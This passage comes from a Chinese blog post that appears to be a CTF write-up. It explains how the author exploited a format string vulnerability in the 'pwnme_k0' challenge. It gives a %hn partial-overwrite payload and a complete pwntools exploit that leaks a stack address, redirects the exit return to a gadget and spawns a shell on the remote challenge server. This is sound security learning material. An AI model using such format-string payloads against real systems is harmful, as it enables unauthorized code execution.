<p><strong>然而世界上最远的距离莫过于在本机辛辛苦苦写的Exp放到远程却不能执行。</strong><br>
失败的原因总的来说就是这种方法不靠谱，每台机器libc段的偏移地址都有差异，再加上用格式化字符串漏洞直接往输出缓冲区写东西本来就不是一种稳当有效的方法，还有写system地址那里输出的一大堆占位空格在远程要传送很久，能在本机执行只能说明瞎拼乱凑的Exp碰巧成功了。</p>
<h2 id="0x05-try2"><a class="header-anchor" href="#0x05-try2">¶</a>0x05 Try2</h2>
<p>按着这两条思路分析到这里已经过去了将近两天的光景，绕来绕去始终没能成功又不甘心放弃。我从头检视一遍之前的分析，看看是不是遗漏了什么。<br>
<img src="http://7j1yti.com1.z0.glb.clouddn.com/1467551283990.png" alt="Alt text"><span class="image-caption">Alt text</span><br>
看到这里<code>bt</code>命令打印出的函数调用栈，除了我们苦苦追求的<code>0x400d74</code>，往下看还有一个<code>0x400e98</code>!一直next跟踪下去发现，之前我们一直在用的<code>0x400d74</code>所在的位置，是打印函数结束时候返回的地址，而<code>0x400e98</code>则是整个程序结束时返回的地址，也就是说我们输入选项3退出程序的时候，才会触发返回到<code>0x400e98</code>的语句。通过同样的方法计算出偏移地址<code>0x7fffffffddf0</code> - <code>0x7fffffffdd48</code> = <code>0xa8</code>，而恰巧在这个ret命令执行时，栈顶第二个位置也是放着我们输入的字符串。</p>
<p>这下思路就很清晰了：</p>
<ol>
<li>用之前的方法往<code>0x400e98</code>所在的位置写入<code>system</code>的地址</li>
<li>选项2，重新输入用户名为<code>/bin/sh</code>的地址，密码随意</li>
<li>选项3，退出程序触发ret命令</li>
</ol>
<p>最后一个问题就是写入整个地址带来的副作用，程序会输出一大堆占位的空格，在本机运行还好，一旦放到远程就会耗费大量的时间，还有可能因为网络延迟被中断。<br>
这里可以改进为用<code>$hn</code>往地址里面写入一个单字，比如我们要把<code>0x400e98</code>改写成<code>0x4008b4</code>(3pop+ret)，可以保留高地址的<code>0x0040</code>，直接往低地址写入<code>0x08b4</code>。具体的payload如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">"%2228x%12$hn"</span>) <span class="comment"># 2228 即0x8b4的十进制形式</span></span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">'junk'</span> + p64(system)+p64(stack_ret))</span><br></pre></td></tr></table></figure>
<p>到了第二步，我们就不用考虑格式化字符串的问题了，所以也不怕<code>0x00</code>造成的截断问题，只需要把<code>/bin/sh</code>地址放到8号位，<code>system</code>地址放到11号位就可以，等到进入选项3触发3pop + ret gadget时，程序就会按预设成功调用<code>system(&quot;/bin/sh&quot;)</code>。以下是能够成功在目标机器上利用的完整Exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x400768</span></span><br><span class="line">pop_rdi = <span class="number">0x400f13</span></span><br><span class="line">ppp = <span class="number">0x4008b4</span></span><br><span class="line">binsh = <span class="number">0x400f38</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwnme_k0')</span></span><br><span class="line">p = remote(<span class="string">'123.59.56.23'</span>,<span class="string">'44110'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom</span><span class="params">()</span>:</span></span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"%14$lx"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"JUNK"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\x00\x00'</span>)</span><br><span class="line">    stack_leak = p.recv(<span class="number">12</span>)</span><br><span class="line">    stack_leak = int(stack_leak, <span class="number">16</span>)</span><br><span class="line">    stack_ret = stack_leak - <span class="number">0xa8</span></span><br><span class="line">    log.info(<span class="string">"stack_leak: %x"</span> % stack_leak)</span><br><span class="line">    log.info(<span class="string">"stack_ret: %x"</span> % stack_ret)</span><br><span class="line"></span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"%2228x%12$hn"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(<span class="string">'junk'</span> + p64(system)+p64(stack_ret))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(p32(binsh))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">'junk'</span> + p64(system))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">boom()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x06-小结"><a class="header-anchor" href="#0x06-小结">¶</a>0x06 小结</h2>
<ol>
<li>
<p>本次题目真的不算很难，主要考验的是对细节的观察和在长度限制下payload的构建，感谢出题者提供这么有意思的题目，让像我这样的菜鸟也能体会到挑战成功的乐趣。</p>
</li>
<li>
<p>在研究Pwn题目的时候，我认为可以从三个维度分析：</p>
<ol>
<li>当前时间帧的维度，也就是调试时某个时间点上，关注所有寄存器和栈上存放的内容</li>
<li>整个程序汇编层面的维度，也就是关注程序本身有什么函数、指针我们是可以利用的，包括构建ROP链时gadget的寻找，<code>/bin/sh</code>字符串的寻找</li>
<li>程序源码的维度，主要就是通过IDA F5反汇编出来的代码，从程序员的角度关注漏洞出现在哪里；我们怎样才能通过程序本身的逻辑去达到我们的目的</li>
</ol>
<p>遇到难以解决的问题不妨跳到另一个维度去思考，通过在这三个维度之间的不同切换配合，才能真正理解程序本身，最终利用它来达到我们的目的。<br>
当然还有最重要的一点：<strong>千万不要吊死在一颗树上</strong>(有不止一个ret点，为什么非要用最近的那个而不是最合适的那个？)</p>
</li>
</ol>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>


    <footer class="post-footer">
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2016/06/09/Booklist2015-2016/" rel="next" title="Booklist2015-2016">
                <i class="fa fa-chevron-left"></i> Booklist2015-2016
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2016/08/26/Fatal-Error/" rel="prev" title="Fatal Error">
                Fatal Error <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>

          
          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目錄
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            本站概覽
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Matthew Shao">
          <p class="site-author-name" itemprop="name">Matthew Shao</p>
          <p class="site-description motion-element" itemprop="description">放弃幻想 准备战斗</p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">60</span>
                <span class="site-state-item-name">文章</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">2</span>
                <span class="site-state-item-name">分類</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">14</span>
                <span class="site-state-item-name">標籤</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/MatthewShao" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Github
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#浅谈格式化字符串漏洞"><span class="nav-number">1.</span> <span class="nav-text">¶浅谈格式化字符串漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.1.</span> <span class="nav-text">¶0x00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-where"><span class="nav-number">1.2.</span> <span class="nav-text">¶0x01 Where</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-why"><span class="nav-number">1.3.</span> <span class="nav-text">¶0x02 Why</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-how"><span class="nav-number">2.</span> <span class="nav-text">¶0x03 How</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#读："><span class="nav-number">2.0.1.</span> <span class="nav-text">¶读：“$”</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写：-n"><span class="nav-number">2.0.2.</span> <span class="nav-text">¶写：“%n”</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-try1"><span class="nav-number">3.</span> <span class="nav-text">¶0x04 Try1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-try2"><span class="nav-number">4.</span> <span class="nav-text">¶0x05 Try2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-小结"><span class="nav-number">5.</span> <span class="nav-text">¶0x06 小结</span></a></li></div>
            

          </div>
        </section>
      <!--/noindex-->
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Matthew Shao</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 強力驅動
</div>

<div class="theme-info">
  主題 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Logos
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  


  <script type="text/javascript" src="/js/src/schemes/logos.js?v=5.1.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  

  




  
  

  

  

  

  


</body>
</html>
